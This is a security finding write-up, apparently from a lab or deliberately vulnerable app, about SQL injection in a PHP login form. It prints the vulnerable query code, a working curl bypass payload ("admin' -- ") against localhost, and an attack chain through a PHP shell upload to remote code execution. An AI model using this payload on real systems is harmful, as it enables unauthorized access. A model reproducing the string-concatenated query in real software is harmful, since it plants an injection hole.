# 03 — SQL injection in the login form (auth bypass)

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** High
- **Difficulty:** Easy

## Where

`web/login.php:14` — `POST /login.php`, field `username` (and indirectly
`password` via `md5()`):

```php
$u = isset($_POST['username']) ? $_POST['username'] : '';
$p = isset($_POST['password']) ? $_POST['password'] : '';
...
$q = 'SELECT * FROM users WHERE username = \'' . $u . '\' AND password_md5 = \'' . md5($p) . '\'';
$r = mysqli_query($db, $q);
$row = mysqli_fetch_assoc($r);
if ($row) {
    $_SESSION['uid'] = $row['id'];
    ...
    header('Location: ' . $dest);   // → /panel/index.php
}
```

## How it works (root cause)

The username is concatenated into a single-quoted string literal with no
escaping. A closing quote followed by a comment terminator neutralises the
password check.

## Exploitation steps

Log in as **any** user — including `admin` — with an empty/wrong password:

```bash
curl -s -c /tmp/admin.jar -D - -o /dev/null \
  --data-urlencode "username=admin' -- " -d 'password=x' \
  http://localhost:8080/login.php
```

## Working PoC (verified)

```
username = admin' --
password = (anything)
```

Resulting SQL:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password_md5 = '...'
```

## Expected result / verification

Response contains:

```
HTTP/1.1 302 Found
Location: /panel/index.php
```

and `GET /panel/index.php` with the new cookie shows the admin panel
(including the upload page). No password knowledge required.

## Attack chain

```
login SQLi → admin session without password
  → /panel/upload.php (16) → PHP shell → RCE
  → session holds a Bearer API token (18) → /api/v1/uplist (17) → RCE
  (session fixation note: id is not regenerated on login, see 23)
```

Also usable for data exfiltration: `username' UNION SELECT ... -- ` in a
context that echoes rows, or boolean probes on `password_md5`.
